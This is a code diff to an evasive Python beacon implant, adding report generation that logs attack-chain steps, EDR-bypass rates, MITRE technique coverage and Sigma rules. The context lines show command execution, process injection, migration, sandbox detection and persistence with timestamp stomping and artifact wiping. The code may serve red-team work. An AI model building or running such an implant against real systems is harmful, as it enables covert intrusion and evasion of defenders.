@@ -125,6 +125,37 @@ except ImportError:
     PersistenceChain = None
     print("[!] Persistence god mode not available")
 
+# NEW: Import report generator pro
+try:
+    from tools.report_generator import (
+        ReportGenerator,
+        ReportConfig,
+        ReportFormat,
+        ReportResult,
+        ChainLog,
+        ChainLogEntry,
+        SigmaRule,
+        YARARule,
+        MITREMapper,
+        AISummaryGenerator,
+        SigmaRuleGenerator,
+        YARARuleGenerator,
+        HTMLReportGenerator,
+        PDFGenerator,
+        DataAnonymizer,
+        create_report_generator,
+        quick_report,
+        create_sample_chain_log,
+        MITRE_TECHNIQUES
+    )
+    REPORT_GENERATOR_AVAILABLE = True
+except ImportError:
+    REPORT_GENERATOR_AVAILABLE = False
+    ReportGenerator = None
+    ChainLog = None
+    ChainLogEntry = None
+    print("[!] Report generator not available")
+
 
 @dataclass
 class BeaconConfig:
@@ -173,6 +204,15 @@ class BeaconConfig:
     persistence_timestamp_stomp: bool = True
     persistence_artifact_wipe: bool = True
     persistence_use_reg_muting: bool = True
+    # NEW: Reporting settings
+    enable_reporting: bool = True
+    report_format: str = "html"  # html, pdf, json, markdown, all
+    report_auto_generate: bool = True
+    report_anonymize: bool = True
+    report_include_sigma: bool = True
+    report_include_mitre: bool = True
+    report_output_dir: str = "reports"
+    report_theme: str = "hacker"  # dark, light, hacker
 
 
 @dataclass
@@ -184,6 +224,8 @@ class BeaconState:
     errors: int = 0
     sandbox_detected: bool = False
     evasion_active: bool = False
+    # NEW: Chain log tracking
+    chain_log_entries: List[Dict] = field(default_factory=list)
 
 
 class EvasiveBeacon:
@@ -238,6 +280,11 @@ class EvasiveBeacon:
         if PERSISTENCE_GOD_AVAILABLE and config.enable_persistence_god:
             self._init_persistence_god()
         
+        # NEW: Initialize report generator
+        self.report_generator = None
+        if REPORT_GENERATOR_AVAILABLE and config.enable_reporting:
+            self._init_report_generator()
+        
         # Task handlers
         self.task_handlers: Dict[str, Callable] = {
             "cmd": self._handle_cmd,
@@ -250,6 +297,7 @@ class EvasiveBeacon:
             "persist": self._handle_persist,
             "migrate": self._handle_migrate,
             "inject": self._handle_inject,  # NEW
+            "report": self._handle_report,  # NEW: Report generation handler
             "exit": self._handle_exit,
         }
         
@@ -470,6 +518,51 @@ class EvasiveBeacon:
         except Exception as e:
             print(f"[!] Failed to initialize persistence god: {e}")
             self.persistence_god = None
+    
+    def _init_report_generator(self):
+        """Initialize report generator engine"""
+        if not REPORT_GENERATOR_AVAILABLE:
+            return
+        
+        try:
+            # Parse format
+            format_map = {
+                'html': ReportFormat.HTML,
+                'pdf': ReportFormat.PDF,
+                'json': ReportFormat.JSON,
+                'markdown': ReportFormat.MARKDOWN,
+                'all': ReportFormat.ALL,
+            }
+            report_format = format_map.get(
+                self.config.report_format.lower(),
+                ReportFormat.HTML
+            )
+            
+            # Create config
+            report_config = ReportConfig(
+                enable_ai_summary=True,
+                enable_mitre_map=self.config.report_include_mitre,
+                enable_sigma_generate=self.config.report_include_sigma,
+                format=report_format,
+                output_dir=self.config.report_output_dir,
+                anonymize_data=self.config.report_anonymize,
+                theme=self.config.report_theme,
+            )
+            
+            # Create generator
+            self.report_generator = ReportGenerator(report_config)
+            
+            print(f"[+] Report generator initialized: {report_format.name}")
+            print(f"    Format: {self.config.report_format}")
+            print(f"    Output dir: {self.config.report_output_dir}")
+            print(f"    Anonymize: {self.config.report_anonymize}")
+            print(f"    Theme: {self.config.report_theme}")
+            print(f"    Include Sigma: {self.config.report_include_sigma}")
+            print(f"    Include MITRE: {self.config.report_include_mitre}")
+            
+        except Exception as e:
+            print(f"[!] Failed to initialize report generator: {e}")
+            self.report_generator = None
     
     def _init_evasion(self):
         """Initialize evasion components"""
@@ -1294,8 +1387,154 @@ class EvasiveBeacon:
                 "error": str(e),
             }
     
+    def _handle_report(self, task: Dict) -> Dict:
+        """
+        Generate chain execution report.
+        
+        Task params:
+            format: Output format (html, pdf, json, markdown, all)
+            output_dir: Output directory
+            anonymize: Anonymize sensitive data
+            include_sigma: Include Sigma rules
+            include_mitre: Include MITRE mapping
+            style: AI summary style (executive, technical, twitter)
+        """
+        result = {
+            "success": False,
+            "report_path": "",
+            "html_path": "",
+            "pdf_path": "",
+            "sigma_rules": [],
+            "mitre_coverage": {},
+            "ai_summary": "",
+            "twitter_thread": [],
+            "error": None,
+        }
+        
+        if not REPORT_GENERATOR_AVAILABLE or not self.report_generator:
+            result["error"] = "Report generator not available"
+            return result
+        
+        try:
+            # Get params
+            params = task.get("params", {})
+            format_str = params.get("format", self.config.report_format)
+            output_dir = params.get("output_dir", self.config.report_output_dir)
+            anonymize = params.get("anonymize", self.config.report_anonymize)
+            include_sigma = params.get("include_sigma", self.config.report_include_sigma)
+            include_mitre = params.get("include_mitre", self.config.report_include_mitre)
+            style = params.get("style", "executive")
+            
+            # Build chain log from state
+            chain_log = self._build_chain_log()
+            
+            # Generate report
+            report_result = self.report_generator.generate_report(chain_log, output_dir)
+            
+            # Copy results
+            result["success"] = report_result.success
+            result["report_path"] = report_result.report_path
+            result["html_path"] = report_result.html_path
+            result["pdf_path"] = report_result.pdf_path
+            result["ai_summary"] = report_result.ai_summary
+            result["twitter_thread"] = report_result.twitter_thread
+            
+            # Convert sigma rules to YAML
+            result["sigma_rules"] = [r.to_yaml() for r in report_result.sigma_rules]
+            
+            # Convert mitre coverage
+            result["mitre_coverage"] = {
+                k: {
+                    "technique_id": v.technique_id,
+                    "technique_name": v.technique_name,
+                    "tactic": v.tactic.name,
+                    "success_count": v.success_count,
+                    "evasion_score": v.evasion_score,
+                }
+                for k, v in report_result.mitre_coverage.items()
+            }
+            
+            if report_result.error:
+                result["error"] = report_result.error
+            
+            # Log report generation
+            self._log_chain_entry(
+                technique="report_generation",
+                tactic="documentation",
+                success=result["success"],
+                edr_bypass=1.0,
+                details={"format": format_str, "path": result["report_path"]},
+            )
+            
+        except Exception as e:
+            result["error"] = str(e)
+        
+        return result
+    
+    def _build_chain_log(self) -> "ChainLog":
+        """Build ChainLog from beacon state"""
+        if not REPORT_GENERATOR_AVAILABLE:
+            return None
+        
+        entries = []
+        for entry_dict in self.state.chain_log_entries:
+            entries.append(ChainLogEntry(**entry_dict))
+        
+        return ChainLog(
+            chain_id=self.config.beacon_id,
+            start_time=datetime.now(),
+            entries=entries,
+            target_host=platform.node(),
+            operator="beacon",
+            notes="Auto-generated from beacon chain execution",
+        )
+    
+    def _log_chain_entry(
+        self,
+        technique: str,
+        tactic: str,
+        success: bool,
+        edr_bypass: float,
+        target_host: str = None,
+        target_user: str = None,
+        details: Dict = None,
+    ):
+        """Log chain execution entry for reporting"""
+        entry = {
+            "timestamp": datetime.now(),
+            "technique": technique,
+            "tactic": tactic,
+            "success": success,
+            "edr_bypass_rate": edr_bypass,
+            "target_host": target_host or platform.node(),
+            "target_user": target_user,
+            "artifacts": [],
+            "detection_details": {},
+            "notes": "",
+        }
+        if details:
+            entry["detection_details"] = details
+        
+        self.state.chain_log_entries.append(entry)
+    
+    def generate_report_on_exit(self) -> Dict:
+        """Generate final report when beacon exits (if auto_report enabled)"""
+        if not self.config.report_auto_generate:
+            return {"skipped": True, "reason": "Auto-report disabled"}
+        
+        return self._handle_report({"params": {}})
+    
     def _handle_exit(self, task: Dict) -> str:
-        """Stop beacon"""
+        """Stop beacon and optionally generate report"""
+        # Auto-generate report if enabled
+        if self.config.report_auto_generate:
+            print("[*] Generating final chain report...")
+            report_result = self.generate_report_on_exit()
+            if report_result.get("success"):
+                print(f"[+] Report generated: {report_result.get('report_path')}")
+            elif report_result.get("error"):
+                print(f"[!] Report generation failed: {report_result.get('error')}")
+        
         self.state.is_running = False
         return "Beacon exiting"
 
